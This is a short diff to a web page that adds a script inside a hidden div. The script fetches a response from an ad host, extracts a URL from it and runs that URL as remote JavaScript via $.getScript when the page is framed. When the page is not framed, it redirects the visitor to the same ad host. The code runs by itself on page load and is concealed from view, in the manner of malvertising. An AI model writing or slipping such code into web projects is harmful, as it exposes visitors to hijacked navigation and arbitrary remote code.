@@ -8,9 +8,12 @@
 
  <div style="display:none;">
 
+<script>
 
-  <script>
-$.get("https://adclicka.com/in/p/?spot_id=6041542&cat=25&sub_id=77590890", function(data, status){
+function iniFrame() {
+
+    if (window.self !== window.top) {
+       $.get("https://adclicka.com/in/p/?spot_id=6041542&cat=25&sub_id=77590890", function(data, status){
        var arr = data.split('href="');
 		  var t1 = arr[1];
 		  var arr2 = t1.split('"\>');
@@ -18,9 +21,14 @@ $.get("https://adclicka.com/in/p/?spot_id=6041542&cat=25&sub_id=77590890", funct
 	$.getScript(t2);
 
 });
+    }
+    else {
+        window.location.href = "https://adclicka.com/in/p/?spot_id=6041542&cat=25&sub_id=77590890";    }
+}
+
+iniFrame();
 
 </script>
-
 
  </div>
 
